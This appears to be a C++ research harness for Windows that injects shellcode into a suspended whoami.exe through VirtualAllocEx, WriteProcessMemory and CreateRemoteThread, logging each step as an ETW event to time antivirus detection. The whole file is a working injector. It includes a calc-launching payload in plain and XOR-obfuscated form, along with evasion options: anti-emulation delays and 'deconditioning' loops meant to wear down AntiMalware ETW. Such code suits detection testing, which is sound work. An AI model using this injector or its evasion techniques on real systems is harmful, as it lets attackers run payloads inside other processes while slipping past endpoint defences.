#include <windows.h>
#include <chrono>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include <thread>
#include <TraceLoggingProvider.h>


// paths
std::string outFile = "C:\\Users\\Public\\Downloads\\attack-output.csv";
LPCWSTR procToInject = L"C:\\Windows\\System32\\whoami.exe";

// my attack provider
TRACELOGGING_DEFINE_PROVIDER(
    g_hProvider,
    "Attack-Provider", // name in the ETW
    (0x72248466, 0x7166, 0x4feb, 0xa3, 0x86, 0x34, 0xd8, 0xf3, 0x5b, 0xb6, 0x37)  // a random GUID
);

int sleep_between_steps_ms = 970; // time to wait between attack steps

UINT64 get_ns_time() {
    /*
    ChronoVsFiletime.exe:
    [*] Timing 1000000000 calls each...
    5.59516 ns per call - GetSystemTimeAsFileTime
    26.9772 ns per call - GetSystemTimePreciseAsFileTime
    23.9806 ns per call - chrono::system_clock::now()
    */
    auto now = std::chrono::system_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(now.time_since_epoch()).count();
}

void print_and_emit_event(std::string msg, std::string pre) {
	UINT64 ns = get_ns_time();
    TraceLoggingWrite(
        g_hProvider,
        "AttackTask", // this is the event name
		TraceLoggingValue(msg.c_str(), "message"),
		TraceLoggingUInt64(ns, "ns_since_epoch")
    );
    std::cout << pre << msg << "\n";
}


int main(int argc, char** argv) {
    // start ETW provider
    TraceLoggingRegister(g_hProvider);

    std::ostringstream msg;
    std::string bef = "[<] ";
    std::string aft = "[>]  ";
    std::string fail = "[!] ";
    std::string ok = "[+] ";

    // anti_emulation should be one of the first actions in the EXE
#if defined anti_emulation_sleep
    msg << "Doing anti emulation sleep for 5 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_ae_sleep = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::seconds(5));
    auto end_ae_sleep = std::chrono::high_resolution_clock::now();
    auto ae_sleep_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_sleep - start_ae_sleep).count();
    msg << "Slept for approximately " << ae_sleep_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
#endif

    // TODO: does deconditioning depend on anti_emulation?
#if defined deconditioning_alloc || defined  deconditioning_calc || defined anti_emulation_calc
    msg << "Doing anti emulation calc operations for about 5 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_ae_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_ae_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 20'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_ae_calc = pr; }
    auto end_ae_calc = std::chrono::high_resolution_clock::now();
    auto ae_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_ae_calc - start_ae_calc).count();
    msg << "Calculated for approximately " << ae_calc_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
#endif

    enum StartupMode { NoWait, WaitTime, WaitForEnter };
    StartupMode s = NoWait;
    int wait_time = 5;

    if (argc == 1) {
        // default
    }
    if (argc >= 2) {
        if (strcmp(argv[1], "--wait") == 0) {
            s = WaitTime;
        }
        if (strcmp(argv[1], "--wait-enter") == 0) {
            s = WaitForEnter;
        }
    }

    // print current 
    msg << "Injector started with PID " << GetCurrentProcessId();
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    // handle config selection
    msg << "Running '";
#if defined standard
    msg << "standard";
#elif defined obfuscation
    msg << "obfuscation";
#elif defined anti_emulation_sleep
    msg << "anti_emulation_sleep";
#elif defined anti_emulation_calc
    msg << "anti_emulation_calc";
#elif defined deconditioning_alloc
    msg << "deconditioning_alloc";
#elif defined deconditioning_calc
    msg << "deconditioning_calc";
#else
    msg << "Release";
    // handle start params only in 'Release' config
    switch (s) {
    case NoWait:
        break;
    case WaitTime:
        for (int i = wait_time; i > 0; i--) {
            std::cout << "[*] Starting injection in " << i << "\n";
            Sleep(1000);
        };
        break;
    case WaitForEnter:
        std::cout << "[*] Press ENTER to start injection...\n";
        std::cin.get();
    default:
        break;
    }
#endif
    msg << "' config";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

    msg << "Before starting subprocess to inject to";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // start new process to inject to
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(procToInject, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        msg << "[!] Failed to start process: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "After starting subprocess with PID " << pi.dwProcessId;
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

    msg << "Before opening process handle";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // open process with read/write access
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pi.dwProcessId);
    if (!hProcess) {
        msg << "Failed to open process: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "After opening process handle";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);

#if defined deconditioning_alloc // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/sirallocalot.c
    BYTE nonsense[4096] = {};
    constexpr int rounds = 100;
    int repetitions = 10; // one repetition is about 0.01 sec (with waiting for thread and freeing memory), according to CPU time with Get-Process
    for (int n = 0; n < repetitions; n++) {

        msg << "Starting deconditioning round " << n;
        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();

        for (int i = 0; i < sizeof(nonsense) / sizeof(nonsense[0]); i++) {
            nonsense[i] = 0x90; // huiiiiiiiiiii
        }
        // xor eax, eax; ret
        nonsense[4093] = 0x31;
        nonsense[4094] = 0xC9;
        nonsense[4095] = 0xC3;

        void* allocs[rounds] = { 0 };
        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            LPVOID alloc_addr = VirtualAllocEx(hProcess, nullptr, sizeof(nonsense), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!alloc_addr) {
                allocs[i] = 0;
                msg << "Failed to alloc mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            allocs[i] = alloc_addr;
            if (!WriteProcessMemory(hProcess, alloc_addr, &nonsense, sizeof(nonsense), NULL)) {
                msg << "Failed to write mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            DWORD old_protect;
            if (!VirtualProtectEx(hProcess, alloc_addr, sizeof(nonsense), PAGE_EXECUTE_READ, &old_protect)) {
                msg << "Failed to change mem to RX in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            HANDLE hThreadDecon = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)alloc_addr, nullptr, 0, nullptr);
            if (!hThreadDecon) {
                msg << "Failed to create remote thread in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
                continue;
            }
            else {
                WaitForSingleObject(hThreadDecon, INFINITE);
                CloseHandle(hThreadDecon);
            }

        }

        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            if (allocs[i] != 0 && !VirtualFreeEx(hProcess, allocs[i], 0, MEM_RELEASE)) {
                msg << "Failed to free mem in round " << n << "-" << i << " , error=" << GetLastError();
                print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
            }
        }

        msg << "Finished deconditioning round " << n;
        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms * 3); // poor AntiMalware-ETW is too slow to keep up
    }
#endif

#if defined deconditioning_calc
    msg << "Doing deconditioning calc operations for about 60 sec";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    auto start_decon_calc = std::chrono::high_resolution_clock::now();
    volatile bool dummy_decon_calc; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 90'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy_decon_calc = pr; }
    auto end_decon_calc = std::chrono::high_resolution_clock::now();
    auto decon_calc_elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end_decon_calc - start_decon_calc).count();
    msg << "Calculated for approximately " << decon_calc_elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms);
#endif

    // antiemulation and deconditioning also depend on obfuscation (anti signature)
#if defined obfuscation || defined antiemulation_sleep || defined antiemulation_calc || defined deconditioning_alloc || defined deconditioning_calc
    msg << "Before decrypting shellcode";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();
    
    // https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=MHhGQywgMHg0OCwgMHg4MywgMHhFNCwgMHhGMCwgMHhFOCwgMHhDMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0MSwgMHg1MSwgMHg0MSwgMHg1MCwgMHg1MiwgMHg1MSwgMHg1NiwgMHg0OCwgMHgzMSwgMHhEMiwgMHg2NSwgMHg0OCwgMHg4QiwgMHg1MiwgMHg2MCwgMHg0OCwgMHg4QiwgMHg1MiwgMHgxOCwgMHg0OCwgMHg4QiwgMHg1MiwgMHgyMCwgMHg0OCwgMHg4QiwgMHg3MiwgMHg1MCwgMHg0OCwgMHgwRiwgMHhCNywgMHg0QSwgMHg0QSwgMHg0RCwgMHgzMSwgMHhDOSwgMHg0OCwgMHgzMSwgMHhDMCwgMHhBQywgMHgzQywgMHg2MSwgMHg3QywgMHgwMiwgMHgyQywgMHgyMCwgMHg0MSwgMHhDMSwgMHhDOSwgMHgwRCwgMHg0MSwgMHgwMSwgMHhDMSwgMHhFMiwgMHhFRCwgMHg1MiwgMHg0MSwgMHg1MSwgMHg0OCwgMHg4QiwgMHg1MiwgMHgyMCwgMHg4QiwgMHg0MiwgMHgzQywgMHg0OCwgMHgwMSwgMHhEMCwgMHg4QiwgMHg4MCwgMHg4OCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHg4NSwgMHhDMCwgMHg3NCwgMHg2NywgMHg0OCwgMHgwMSwgMHhEMCwgMHg1MCwgMHg4QiwgMHg0OCwgMHgxOCwgMHg0NCwgMHg4QiwgMHg0MCwgMHgyMCwgMHg0OSwgMHgwMSwgMHhEMCwgMHhFMywgMHg1NiwgMHg0OCwgMHhGRiwgMHhDOSwgMHg0MSwgMHg4QiwgMHgzNCwgMHg4OCwgMHg0OCwgMHgwMSwgMHhENiwgMHg0RCwgMHgzMSwgMHhDOSwgMHg0OCwgMHgzMSwgMHhDMCwgMHhBQywgMHg0MSwgMHhDMSwgMHhDOSwgMHgwRCwgMHg0MSwgMHgwMSwgMHhDMSwgMHgzOCwgMHhFMCwgMHg3NSwgMHhGMSwgMHg0QywgMHgwMywgMHg0QywgMHgyNCwgMHgwOCwgMHg0NSwgMHgzOSwgMHhEMSwgMHg3NSwgMHhEOCwgMHg1OCwgMHg0NCwgMHg4QiwgMHg0MCwgMHgyNCwgMHg0OSwgMHgwMSwgMHhEMCwgMHg2NiwgMHg0MSwgMHg4QiwgMHgwQywgMHg0OCwgMHg0NCwgMHg4QiwgMHg0MCwgMHgxQywgMHg0OSwgMHgwMSwgMHhEMCwgMHg0MSwgMHg4QiwgMHgwNCwgMHg4OCwgMHg0OCwgMHgwMSwgMHhEMCwgMHg0MSwgMHg1OCwgMHg0MSwgMHg1OCwgMHg1RSwgMHg1OSwgMHg1QSwgMHg0MSwgMHg1OCwgMHg0MSwgMHg1OSwgMHg0MSwgMHg1QSwgMHg0OCwgMHg4MywgMHhFQywgMHgyMCwgMHg0MSwgMHg1MiwgMHhGRiwgMHhFMCwgMHg1OCwgMHg0MSwgMHg1OSwgMHg1QSwgMHg0OCwgMHg4QiwgMHgxMiwgMHhFOSwgMHg1NywgMHhGRiwgMHhGRiwgMHhGRiwgMHg1RCwgMHg0OCwgMHhCQSwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHg0OCwgMHg4RCwgMHg4RCwgMHgwMSwgMHgwMSwgMHgwMCwgMHgwMCwgMHg0MSwgMHhCQSwgMHgzMSwgMHg4QiwgMHg2RiwgMHg4NywgMHhGRiwgMHhENSwgMHhCQiwgMHhGMCwgMHhCNSwgMHhBMiwgMHg1NiwgMHg0MSwgMHhCQSwgMHhBNiwgMHg5NSwgMHhCRCwgMHg5RCwgMHhGRiwgMHhENSwgMHg0OCwgMHg4MywgMHhDNCwgMHgyOCwgMHgzQywgMHgwNiwgMHg3QywgMHgwQSwgMHg4MCwgMHhGQiwgMHhFMCwgMHg3NSwgMHgwNSwgMHhCQiwgMHg0NywgMHgxMywgMHg3MiwgMHg2RiwgMHg2QSwgMHgwMCwgMHg1OSwgMHg0MSwgMHg4OSwgMHhEQSwgMHhGRiwgMHhENSwgMHg2MywgMHg2MSwgMHg2QywgMHg2MywgMHgyRSwgMHg2NSwgMHg3OCwgMHg2NSwgMHgwMA
    BYTE shellcode[] = { 0xbd,0x0a,0xc2,0xa6,0xb1,0xaa,0x81,0x42,0x41,0x42,0x00,0x13,0x00,0x12,0x13,0x13,0x17,0x0a,0x70,0x90,0x24,0x0a,0xca,0x10,0x21,0x0a,0xca,0x10,0x59,0x0a,0xca,0x10,0x61,0x0a,0xca,0x30,0x11,0x0a,0x4e,0xf5,0x0b,0x08,0x0c,0x73,0x88,0x0a,0x70,0x82,0xed,0x7e,0x20,0x3e,0x43,0x6e,0x61,0x03,0x80,0x8b,0x4c,0x03,0x40,0x83,0xa3,0xaf,0x13,0x03,0x10,0x0a,0xca,0x10,0x61,0xc9,0x03,0x7e,0x09,0x43,0x91,0xc9,0xc1,0xca,0x41,0x42,0x41,0x0a,0xc4,0x82,0x35,0x25,0x09,0x43,0x91,0x12,0xca,0x0a,0x59,0x06,0xca,0x02,0x61,0x0b,0x40,0x92,0xa2,0x14,0x09,0xbd,0x88,0x03,0xca,0x76,0xc9,0x0a,0x40,0x94,0x0c,0x73,0x88,0x0a,0x70,0x82,0xed,0x03,0x80,0x8b,0x4c,0x03,0x40,0x83,0x79,0xa2,0x34,0xb3,0x0d,0x41,0x0d,0x66,0x49,0x07,0x78,0x93,0x34,0x9a,0x19,0x06,0xca,0x02,0x65,0x0b,0x40,0x92,0x27,0x03,0xca,0x4e,0x09,0x06,0xca,0x02,0x5d,0x0b,0x40,0x92,0x00,0xc9,0x45,0xca,0x09,0x43,0x91,0x03,0x19,0x03,0x19,0x1c,0x18,0x18,0x00,0x1a,0x00,0x1b,0x00,0x18,0x09,0xc1,0xad,0x62,0x00,0x10,0xbe,0xa2,0x19,0x03,0x18,0x18,0x09,0xc9,0x53,0xab,0x16,0xbd,0xbe,0xbd,0x1c,0x0a,0xfb,0x43,0x41,0x42,0x41,0x42,0x41,0x42,0x41,0x0a,0xcc,0xcf,0x40,0x43,0x41,0x42,0x00,0xf8,0x70,0xc9,0x2e,0xc5,0xbe,0x97,0xfa,0xb2,0xf4,0xe0,0x17,0x03,0xfb,0xe4,0xd4,0xff,0xdc,0xbd,0x94,0x0a,0xc2,0x86,0x69,0x7e,0x47,0x3e,0x4b,0xc2,0xba,0xa2,0x34,0x47,0xfa,0x05,0x52,0x30,0x2e,0x28,0x41,0x1b,0x00,0xcb,0x9b,0xbd,0x94,0x21,0x20,0x2e,0x22,0x6c,0x24,0x3a,0x24,0x42 };
    for (size_t i = 0; i < sizeof(shellcode) / sizeof(shellcode[0]); ++i) { shellcode[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
    
    msg << "After decrypting shellcode";
    print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
    Sleep(sleep_between_steps_ms); 
#else
    // byte array of value to write
    BYTE shellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00 };
#endif

    msg << "Before allocating memory for shellcode";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // allocate memory to new process
    LPVOID remote_addr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote_addr) {
        msg << "After allocating memory for shellcode at " << (void*)remote_addr;
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to allocate memory: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
    }

    msg << "Before writing shellcode to process";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // write value into process' memory
    SIZE_T bytes_written;
    if (WriteProcessMemory(hProcess, remote_addr, &shellcode, sizeof(shellcode), &bytes_written)) {
        msg << "After writing shellcode to process at " << (void*)remote_addr;
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to write memory: " << GetLastError();
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        return 1;
    }

    msg << "Before changing memory protection to PAGE_EXECUTE_READ";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    // change memory protection to executable
    DWORD old_protect;
    if (VirtualProtectEx(hProcess, remote_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
        msg << "After changing memory protection to PAGE_EXECUTE_READ";
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to change memory protection: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    msg << "Before reading memory to verify write";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

    /*
    // read written bytes back for verification
    BYTE verify_buf[sizeof(shellcode)] = { 0 };
    SIZE_T bytes_read;
    if (ReadProcessMemory(hProcess, remote_addr, &verify_buf, sizeof(shellcode), &bytes_read)) {
        bool match = (bytes_read == sizeof(shellcode)) && (memcmp(shellcode, verify_buf, sizeof(shellcode)) == 0);
        if (match) {
            msg << "After reading memory to verify write";
            print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
            Sleep(sleep_between_steps_ms);
        }
        else {
            msg << "Failed to verify written shellcode";
            print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
            VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return 1;
        }
    }
    else {
        msg << "Failed to read back memory for verification: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    */

    msg << "Before creating remote thread";
    print_and_emit_event(msg.str(), bef); msg.str({}); msg.clear();

	// call create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_addr, nullptr, 0, nullptr);
    if (hThread) {
        msg << "After creating remote thread";
        print_and_emit_event(msg.str(), aft); msg.str({}); msg.clear();
		Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed to create remote thread: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
        return 1;
	}

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    msg << "Attack done";
    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
    TraceLoggingUnregister(g_hProvider);
    return 0;
}
